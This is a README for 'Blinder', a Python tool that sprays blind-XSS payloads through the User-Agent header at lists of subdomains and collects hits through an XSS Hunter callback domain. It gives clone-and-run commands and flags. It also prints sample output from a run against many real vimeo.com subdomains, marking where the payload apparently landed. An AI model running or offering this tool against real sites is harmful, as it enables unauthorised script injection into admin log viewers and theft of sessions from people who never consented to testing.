# Blinder
- A Tool Written In Python3 For Sending Blind-XSS Payloads On The User-Agent 

## Usage
```
git clone https://www.github.com/DEMON1A/Blinder.git
cd Blinder
python3 Blinder.py username.xss.ht SubDomains.txt
```

## Description
- Blinder Is Used To Send Blind-XSS Payloads With HTTP Requests On The User-Agent Header. In Case Some Web Application Is Showing The Logs To The Admin Without HTML Escaping. Blinder Take Two Args With The Run Command First One Should Be Your XSS-Hunter Sub-Domain That Will Sent You The Details If The XSS-Payload Is Fired. You Can Use Your Username Without ```.xss.ht``` If You Added ```-u``` At The End Of The Command For Example ```python3 Blinder.py username Hosts -u```

- Blinder Isn't That Fast So It Requires Good Internet Speed. If You Have Any Suggestions To Improve The Tool Speed With The Code. Feel Free To Contact Me Or Make Changes On The Code.

- I Will Update The Tool Soon So You Can Select Any Payload You Want With Other Headers But You Can Always Edit The Code With Whatever You Want To Use On It. Also All Of The Function On The Code Are Separated You Can Simply Import/Copy Them From The Code Into You Code By Removing The External Functions That You Won't Use So You Can Use The Function.

- Blinder Contains Basic Response Code Check. Feel Free To Add Any Response Code On StatusCheck Function With The Desription. And I Would Love To Mergo It Here.

### Output 
```
root@MohammedDief:~/Programing/PythonProjects/Blinder$ python3 Blinder.py {username}.xss.ht vimeo.com.robe 
Internal Server Error, Maybe From The User-agent, Check That. Url: https://dev.starlord.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512435600.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512435592.cloud.vimeo.com
Internal Server Error, Maybe From The User-agent, Check That. Url: http://dev.starlord.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512435583.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: http://1512435600.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: http://1512435592.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: http://1512435583.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512476430.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512476432.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512435595.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: http://1512476430.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: http://1512476432.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: http://1512435595.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512435596.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: http://1512435596.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512435594.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: http://1512435594.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: https://magic.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: http://magic.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: https://live-api.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: https://i.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: http://live-api.cloud.vimeo.com
Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512435597.cloud.vimeo.com
^C
Exit.
```
